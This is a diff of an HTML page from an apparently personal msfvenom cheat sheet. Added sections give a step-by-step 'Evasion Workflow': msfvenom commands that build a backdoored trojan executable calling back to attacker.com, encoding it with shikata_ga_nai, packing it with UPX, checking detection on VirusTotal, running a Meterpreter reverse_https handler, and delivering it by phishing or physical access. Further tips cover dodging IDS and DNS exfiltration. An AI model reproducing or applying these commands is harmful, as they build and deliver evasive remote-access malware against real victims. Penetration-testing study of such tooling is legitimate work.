@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>msfvenom cheat sheet - notebook</title>
+        <title>msfvenom Cheatsheet - notebook</title>
 
 
         <!-- Custom HTML head -->
@@ -38,10 +38,10 @@
             const path_to_root = "../";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../searchindex-e5200d07.js";
+            window.path_to_searchindex_js = "../searchindex-ac4c2b02.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="../toc-33caecdc.js"></script>
+        <script src="../toc-f4375573.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -181,7 +181,7 @@
 
                 <div id="mdbook-content" class="content">
                     <main>
-                        <h1 id="msfvenom-cheat-sheet"><a class="header" href="#msfvenom-cheat-sheet">msfvenom cheat sheet</a></h1>
+                        <h1 id="msfvenom-cheatsheet"><a class="header" href="#msfvenom-cheatsheet">msfvenom Cheatsheet</a></h1>
 <h2 id="protection-types"><a class="header" href="#protection-types">Protection Types</a></h2>
 <div class="table-wrapper">
 <table>
@@ -236,10 +236,12 @@
 </tbody>
 </table>
 </div>
+<p>With <code>-k</code>, the original application runs normally while the payload executes in a separate thread. However, if launched from the CLI, a separate window may appear.</p>
 <h3 id="generate-encoded-payload"><a class="header" href="#generate-encoded-payload">Generate Encoded Payload</a></h3>
 <pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
   -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
 </code></pre>
+<p>Simply encoding payloads with multiple iterations is often not sufficient for all AV products.</p>
 <hr>
 <h2 id="virustotal-analysis"><a class="header" href="#virustotal-analysis">VirusTotal Analysis</a></h2>
 <pre><code class="language-bash">msf-virustotal -k &lt;API_key&gt; -f payload.exe
@@ -253,6 +255,7 @@ zip -e -P secretpass payload.zip payload.exe
 </code></pre>
 <hr>
 <h2 id="popular-packers"><a class="header" href="#popular-packers">Popular Packers</a></h2>
+<p>Packers compress and obfuscate executables by packing the payload with decompression code. When run, decompression restores the original executable transparently.</p>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -300,14 +303,57 @@ upx -d packed_payload.exe
  [ 'Windows 2000 SP4 English', { 'Ret' =&gt; 0x77e14c29, 'Offset' =&gt; 5093 } ],
 ],
 </code></pre>
+<p>IPS/IDS regularly check for standard NOP sleds. Use randomized shellcode encoding and vary NOP equivalents.</p>
 <hr>
-<h2 id="msf6-aes-encryption"><a class="header" href="#msf6-aes-encryption">MSF6 AES Encryption</a></h2>
-<p>MSF6 supports AES-encrypted communication for Meterpreter sessions:</p>
-<pre><code class="language-bash"># Meterpreter runs in memory with encrypted tunnel
+<h2 id="msf6-encrypted-sessions"><a class="header" href="#msf6-encrypted-sessions">MSF6 Encrypted Sessions</a></h2>
+<p>MSF6 can tunnel AES-encrypted communication from Meterpreter shells, encrypting traffic as the payload is sent. Meterpreter runs in memory (no file on disk).</p>
+<pre><code class="language-bash">use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
 set EnableStageEncoding true
 set StageEncoder x64/xor
+run -j
 </code></pre>
+<hr>
+<h2 id="dns-exfiltration"><a class="header" href="#dns-exfiltration">DNS Exfiltration</a></h2>
+<p>In cases with strict traffic rules, DNS can be used for data exfiltration. Often allowed through firewalls and difficult to detect without DNS-specific monitoring. Slow but stealthy (notably used in the Equifax breach, 2017).</p>
+<hr>
+<h2 id="evasion-workflow"><a class="header" href="#evasion-workflow">Evasion Workflow</a></h2>
+<h3 id="step-1-choose-delivery-method"><a class="header" href="#step-1-choose-delivery-method">Step 1: Choose Delivery Method</a></h3>
+<ul>
+<li>Backdoored executable</li>
+<li>Macro-enabled document</li>
+<li>Script file (JS, VBS, PS1)</li>
+<li>Archive with password</li>
+</ul>
+<h3 id="step-2-apply-obfuscation"><a class="header" href="#step-2-apply-obfuscation">Step 2: Apply Obfuscation</a></h3>
+<pre><code class="language-bash"># Generate encoded backdoored executable
+msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 \
+  -x legit_app.exe -k \
+  -e x86/shikata_ga_nai -i 15 \
+  -f exe -o trojan.exe
+</code></pre>
+<h3 id="step-3-pack-the-payload-optional"><a class="header" href="#step-3-pack-the-payload-optional">Step 3: Pack the Payload (Optional)</a></h3>
+<pre><code class="language-bash">upx -9 trojan.exe -o trojan_packed.exe
+</code></pre>
+<h3 id="step-4-test-detection"><a class="header" href="#step-4-test-detection">Step 4: Test Detection</a></h3>
+<pre><code class="language-bash">msf-virustotal -k &lt;API_key&gt; -f trojan_packed.exe
+</code></pre>
+<h3 id="step-5-setup-handler"><a class="header" href="#step-5-setup-handler">Step 5: Setup Handler</a></h3>
+<pre><code class="language-bash">use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set EnableStageEncoding true
+run -j
+</code></pre>
+<h3 id="step-6-deliver-and-execute"><a class="header" href="#step-6-deliver-and-execute">Step 6: Deliver and Execute</a></h3>
+<ul>
+<li>Social engineering / phishing email</li>
+<li>Physical access</li>
+<li>Exploit existing vulnerability</li>
+</ul>
 <hr>
 <h2 id="quick-reference"><a class="header" href="#quick-reference">Quick Reference</a></h2>
 <h3 id="generate-stealthy-payload"><a class="header" href="#generate-stealthy-payload">Generate Stealthy Payload</a></h3>
@@ -316,14 +362,6 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 \
   -x legit_installer.exe -k \
   -e x86/shikata_ga_nai -i 10 \
   -f exe -o trojan_installer.exe
-</code></pre>
-<h3 id="handler-setup-for-encrypted-session"><a class="header" href="#handler-setup-for-encrypted-session">Handler Setup for Encrypted Session</a></h3>
-<pre><code class="language-bash">use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_https
-set LHOST 0.0.0.0
-set LPORT 443
-set EnableStageEncoding true
-run -j
 </code></pre>
 <hr>
 <h2 id="evasion-checklist"><a class="header" href="#evasion-checklist">Evasion Checklist</a></h2>
@@ -342,7 +380,6 @@ run -j
 <h2 id="references"><a class="header" href="#references">References</a></h2>
 <ul>
 <li><a href="https://www.ftc.gov/equifax-data-breach">US Government Post-Mortem Report on Equifax Hack</a></li>
-<li><a href="https://www.infoblox.com/">Protecting from DNS Exfiltration</a></li>
 <li><a href="https://github.com/polypack">PolyPack Project</a></li>
 <li>Metasploit - The Penetration Tester’s Guide (No Starch Press)</li>
 </ul>
